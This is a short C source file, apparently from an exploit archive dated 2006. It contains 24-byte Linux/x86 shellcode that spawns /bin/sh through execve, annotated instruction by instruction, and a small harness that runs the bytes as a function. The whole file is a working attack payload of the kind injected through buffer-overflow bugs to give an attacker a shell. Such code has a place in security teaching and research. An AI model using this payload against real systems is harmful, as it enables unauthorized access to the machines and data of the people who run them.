/*
 * [Linux/x86]
 * Shellcode for: execve("/bin/sh", ["/bin/sh"], NULL)
 * 24 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 */

char shellcode[] =

"\x99"                         // cltd
"\x31\xc0"                     // xor    %eax,%eax
"\x52"                         // push   %edx
"\x68\x6e\x2f\x73\x68"         // push   $0x68732f6e
"\x68\x2f\x2f\x62\x69"         // push   $0x69622f2f
"\x89\xe3"                     // mov    %esp,%ebx
"\x52"                         // push   %edx
"\x53"                         // push   %ebx
"\x89\xe1"                     // mov    %esp,%ecx
"\xb0\x0b"                     // mov    $0xb,%al
"\xcd\x80";                    // int    $0x80

int main() {

	void (*p)();
	p = (void *)&shellcode;
	printf("Lenght: %d\n", strlen(shellcode));
	p();
}

// milw0rm.com [2006-05-01]